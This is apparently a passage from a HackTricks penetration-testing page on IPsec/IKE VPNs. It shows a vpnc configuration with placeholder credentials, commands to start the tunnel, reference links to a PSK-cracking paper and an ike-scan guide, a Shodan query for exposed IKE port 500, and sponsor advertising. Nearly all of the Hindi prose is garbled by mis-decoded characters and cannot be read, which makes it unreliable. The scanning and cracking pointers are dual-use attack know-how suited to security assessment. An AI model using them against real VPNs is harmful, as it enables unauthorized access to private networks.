рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХрдорд╛рдВрдб рдФрд░ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди VPN рдХрдиреЗрдХреНрд╢рди рд╕реНрдерд╛рдкрд┐рдд рдХрд░рдиреЗ рдХреА рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХрд╛ рд╡рд┐рд╡рд░рдг рдкреНрд░рд╕реНрддреБрдд рдХрд░рддреЗ рд╣реИрдВ:
```bash
root@system:~# cat > /etc/vpnc/samplevpn.conf << STOP
IPSec gateway [VPN_GATEWAY_IP]
IPSec ID [VPN_CONNECTION_ID]
IPSec secret [VPN_GROUP_SECRET]
IKE Authmode psk
Xauth username [VPN_USERNAME]
Xauth password [VPN_PASSWORD]
STOP
root@system:~# vpnc samplevpn
VPNC started in background (pid: [PID])...
root@system:~# ifconfig tun0
```
In this setup:

- `[VPN_GATEWAY_IP]` рдХреЛ VPN рдЧреЗрдЯрд╡реЗ рдХрд╛ рд╡рд╛рд╕реНрддрд╡рд┐рдХ IP рдкрддрд╛ рд╕реЗ рдмрджрд▓реЗрдВред
- `[VPN_CONNECTION_ID]` рдХреЛ VPN рдХрдиреЗрдХреНрд╢рди рдХреЗ рд▓рд┐рдП рдкрд╣рдЪрд╛рдирдХрд░реНрддрд╛ рд╕реЗ рдмрджрд▓реЗрдВред
- `[VPN_GROUP_SECRET]` рдХреЛ VPN рдХреЗ рд╕рдореВрд╣ рдЧреБрдкреНрдд рд╕реЗ рдмрджрд▓реЗрдВред
- `[VPN_USERNAME]` рдФрд░ `[VPN_PASSWORD]` рдХреЛ VPN рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕ рд╕реЗ рдмрджрд▓реЗрдВред
- `[PID]` `vpnc` рд╢реБрд░реВ рдХрд░рддреЗ рд╕рдордп рдирд┐рд░реНрдзрд╛рд░рд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛ред

VPN рдХреЛ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд░рддреЗ рд╕рдордп, рдХреГрдкрдпрд╛ рдкреНрд▓реЗрд╕рд╣реЛрд▓реНрдбрд░ рдХреА рдЬрдЧрд╣ рд╡рд╛рд╕реНрддрд╡рд┐рдХ рдФрд░ рд╕реБрд░рдХреНрд╖рд┐рдд рдорд╛рдиреЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВред

## рд╕рдВрджрд░реНрдн рд╕рд╛рдордЧреНрд░реА

* [PSK рдХреНрд░реИрдХрд┐рдВрдЧ рдкреЗрдкрд░](http://www.ernw.de/download/pskattack.pdf)
* [рд╕реБрд░рдХреНрд╖рд╛ рдХреЗрдВрджреНрд░рд┐рдд рдЬрд╛рдирдХрд╛рд░реА](http://www.securityfocus.com/infocus/1821)
* [рдПрдХ VPN рдХрд╛рд░реНрдпрд╛рдиреНрд╡рдпрди рдХреЛ рд╕реНрдХреИрди рдХрд░реЗрдВ](http://www.radarhack.com/dir/papers/Scanning\_ike\_with\_ikescan.pdf)
* рдиреЗрдЯрд╡рд░реНрдХ рд╕реБрд░рдХреНрд╖рд╛ рдореВрд▓реНрдпрд╛рдВрдХрди 3 рд╡реАрдВ рд╕рдВрд╕реНрдХрд░рдг

## рд╢реЛрдбрди

* `port:500 IKE`

<figure><img src="broken-reference" alt=""><figcaption></figcaption></figure>

рд╡рд┐рд╢реЗрд╖рддрд╛ рдЬреЛ рдорд╣рддреНрд╡рдкреВрд░реНрдг рд╣реИрдВ рдЙрдиреНрд╣реЗрдВ рдЦреЛрдЬреЗрдВ рддрд╛рдХрд┐ рдЖрдк рдЙрдиреНрд╣реЗрдВ рддреЗрдЬреА рд╕реЗ рдареАрдХ рдХрд░ рд╕рдХреЗрдВред Intruder рдЖрдкрдХреА рд╣рдорд▓реЗ рдХреА рд╕рддрд╣ рдХрд╛ рдЯреНрд░реИрдХ рдХрд░рддрд╛ рд╣реИ, рдкреНрд░реЛрдПрдХреНрдЯрд┐рд╡ рдзрд╛рд░рдгрд╛ рд╕реНрдХреИрди рдЪрд▓рд╛рддрд╛ рд╣реИ, рдЖрдкрдХреА рдкреВрд░реЗ рддрдХрдиреАрдХреА рд╕реНрдЯреИрдХ, API рд╕реЗ рд╡реЗрдм рдРрдкреНрд╕ рдФрд░ рдХреНрд▓рд╛рдЙрдб рд╕рд┐рд╕реНрдЯрдо рддрдХ рдореБрджреНрджреЗ рдЦреЛрдЬрддрд╛ рд╣реИред [**рдЗрд╕реЗ рдореБрдлреНрдд рдореЗрдВ рдкреНрд░рдпрд╛рд╕ рдХрд░реЗрдВ**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) рдЖрдЬред

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

<details>

<summary><strong>рдЬрд╛рдиреЗрдВ AWS рд╣реИрдХрд┐рдВрдЧ рдХреЛ рд╢реВрдиреНрдп рд╕реЗ рд╣реАрд░реЛ рддрдХ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> рдХреЗ рд╕рд╛рде!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдпрджрд┐ рдЖрдк рдЕрдкрдиреА рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ HackTricks рдореЗрдВ рдпрд╛ HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ рддреЛ [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рдиреНрд╕**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* рд╣рдорд╛рд░реЗ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рдХрд▓реЗрдХреНрд╢рди, [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдЦреЛрдЬреЗрдВ
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** ЁЯТм [**рдбрд┐рд╕реНрдХреЙрд░реНрдб рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ **рдореЗрд░рд╛** **рдЯреНрд╡рд┐рдЯрд░** ЁЯРж [**@carlospolopm**](https://twitter.com/carlospolopm)** рдХрд╛** **рдкрд╛рд▓рди** рдХрд░реЗрдВред
* **рдЕрдкрдиреЗ рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ PRs рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ** [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos рдХреЛ рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗред

</details>
